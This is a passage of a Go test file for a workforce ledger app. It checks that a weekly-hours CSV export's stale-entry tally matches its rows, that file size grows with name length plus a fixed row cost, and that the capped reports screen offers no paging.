		t.Fatalf("a tally bounded at the screen's cap would report %d and the truth is %d; "+
			"the fixture cannot tell a backlog count from a page count", pageBound, stale)
	}
	// AND IT AGREES WITH THE ROWS BENEATH IT, which is the property that makes one
	// number rather than two.
	head := rowStartingWith(rows, "employee")
	col := -1
	for i, c := range head {
		if c == "needs_action" {
			col = i
		}
	}
	if col < 0 {
		t.Fatal("the open block has no needs_action column")
	}
	counted := 0
	for _, r := range rows {
		if len(r) == len(head) && r[0] != "employee" && r[col] == "yes" {
			counted++
		}
	}
	if counted != stale {
		t.Errorf("the rows say %d need action and the tally says %s", counted, row[1])
	}

	// POSITIVE CONTROL: with nothing stale the line is a measured zero rather than
	// absent — silence and "none" are different claims.
	calm := newFakeLedger()
	calm.hours = reportWith(func(r *ledger.Report) {
		r.Totals.Open = 1
		r.Open = []ledger.OpenEntry{{EmployeeName: "Maria Borg", At: week.From}}
	})
	cb, _ := exportBrowser(t, calm)
	calmRows, _ := exportCSV(t, cb, "")
	if row := rowStartingWith(calmRows, "Open too long to be somebody on shift"); row == nil || row[1] != "0" {
		t.Errorf("with nothing stale the export says %v, want a measured 0", row)
	}
}

// TestReportCSVSize_IsAboutTheNameLengthPlusAFixedRow re-derives the cost claim in
// reportCSV's comment instead of restating it.
//
// 🔴 A BYTE TOTAL WITHOUT ITS FIXTURE IS UNREPRODUCIBLE, which a reviewer demonstrated
// by re-running the ceiling row with a shorter name and getting a figure 150 000 B
// lower — a fair correction, and exactly the name-length delta. So what is asserted
// here is the SHAPE of the cost (a fixed row plus the name), which is what a reader
// needs in order to predict a size this table cannot enumerate.
func TestReportCSVSize_IsAboutTheNameLengthPlusAFixedRow(t *testing.T) {
	build := func(people int, name string) int {
		rep := reportWith(func(r *ledger.Report) {
			r.Totals = ledger.Totals{Worked: time.Duration(people) * time.Hour, Shifts: people}
			for i := 0; i < people; i++ {
				d := make([]time.Duration, ledger.ReportDays)
				d[i%ledger.ReportDays] = 8 * time.Hour
				r.People = append(r.People, ledger.PersonHours{
					EmployeeID: uuid.New(), Name: name, Worked: 8 * time.Hour, Shifts: 1, Daily: d,
				})
			}
		})
		doc, err := reportCSV(rep, weekOfUTC().From)
		if err != nil {
			t.Fatalf("reportCSV: %v", err)
		}
		return len(doc)
	}
	const people = 200
	short, long := "abcde", "abcdefghijklmno" // 5 and 15 bytes
	got := build(people, long) - build(people, short)
	want := people * (len(long) - len(short))
	if got != want {
		t.Errorf("lengthening every name by %d bytes changed the file by %d bytes, want %d; "+
			"the per-row cost is not the fixed row plus the name, so reportCSV's table "+
			"cannot be read the way it says", len(long)-len(short), got, want)
	}

	// THE FIXED PART IS DERIVED FROM TWO ROW COUNTS AT THE SAME NAME LENGTH, so the
	// preamble cancels and no assumption about it is needed.
	//
	// ⚠️ AND THE FIRST VERSION OF THIS DERIVATION SUBTRACTED A REPORT WITH NO NAME AT
	// ALL, which is not a zero-length name: personName("") is the words "Unknown
	// employee". It answered a NEGATIVE row cost, which is how the mistake announced
	// itself. An empty fixture is not the zero of this measurement.
	perRow := (build(2*people, short) - build(people, short)) / people
	t.Logf("a person row costs %d bytes: %d of structure plus a %d-byte name (fixture: "+
		"%d day columns, one uuid, one non-zero daily cell)",
		perRow, perRow-len(short), len(short), ledger.ReportDays)
	if perRow-len(short) < 40 || perRow-len(short) > 400 {
		t.Errorf("the derived fixed row cost is %d bytes, which is outside any plausible "+
			"range for this column list — the derivation is measuring the wrong thing",
			perRow-len(short))
	}
}

// TestReportsScreen_HasNoCursorSoRowsPastTheCapAreEXPORTOnly pins the fact the audit
// justification in reportsExport now rests on.
//
// 🔴 THE COMMENT USED TO CLAIM MORE THAN WAS TRUE. It said the export's figures are
// "already reachable without any audit row" on the reports screen — right for the
// TOTALS, wrong for the ROWS: the screen lists maxReportRows people and has no cursor,
// so the hundred-and-first person's row is reachable through the export and nowhere
// else in this section. The sentence was narrowed; this is what keeps the narrowed
// version honest. If a future round gives the screen paging, this goes red and the
// audit paragraph has to be re-taken rather than inherited.
func TestReportsScreen_HasNoCursorSoRowsPastTheCapAreEXPORTOnly(t *testing.T) {
	const people = maxReportRows + 11
	records := newFakeLedger()
	records.hours = reportWith(func(r *ledger.Report) {
		r.Totals = ledger.Totals{Worked: time.Duration(people) * time.Hour, Shifts: people}
		for i := 0; i < people; i++ {
			r.People = append(r.People, ledger.PersonHours{
				EmployeeID: uuid.New(), Name: "Employee " + pad2(i),
				Worked: time.Hour, Shifts: 1, Daily: make([]time.Duration, ledger.ReportDays),
			})
		}
	})
	b, _ := exportBrowser(t, records)
	body := b.do(http.MethodGet, reportsHref, nil).Body.String()

	// POSITIVE CONTROL: the screen really is over its cap in this fixture.
	if !strings.Contains(body, "Showing 100 of 111 people") {
		t.Fatal("the screen is not capped here, so the absence of paging proves nothing")
	}
	// THE CLAIM: no link on this page continues the LISTING. The week controls and the
	// export are the only in-product links it offers.
	for _, href := range sameOriginHrefs(body) {
		if strings.HasPrefix(href, "/static/") || strings.HasPrefix(href, reportsCSVHref) {
			continue
		}
		if !strings.HasPrefix(href, reportsHref) {
			continue
		}
		for _, cursor := range []string{"after_", "cursor", "page", "offset", "before_"} {
			if strings.Contains(href, cursor) {
				t.Errorf("the reports screen offers %q, which continues the listing. The "+
					"export's audit paragraph says rows past the cap are export-only; that "+
					"is now false.", href)
			}
		}
	}
	// AND STRUCTURALLY: the view has no field a cursor could travel in.
	rt := reflect.TypeOf(pages.ReportsView{})
	for i := 0; i < rt.NumField(); i++ {
		low := strings.ToLower(rt.Field(i).Name)
		for _, cursor := range []string{"cursor", "after", "offset", "nextpage"} {
			if strings.Contains(low, cursor) {
				t.Errorf("pages.ReportsView.%s could carry a paging position", rt.Field(i).Name)
			}
		}
	}
	// The person past the cap really is absent from the screen — the other half of
	// "export-only".
	if strings.Contains(body, "Employee "+pad2(people-1)) {
		t.Error("the last person IS on the screen, so nothing about this fixture is export-only")
	}
}
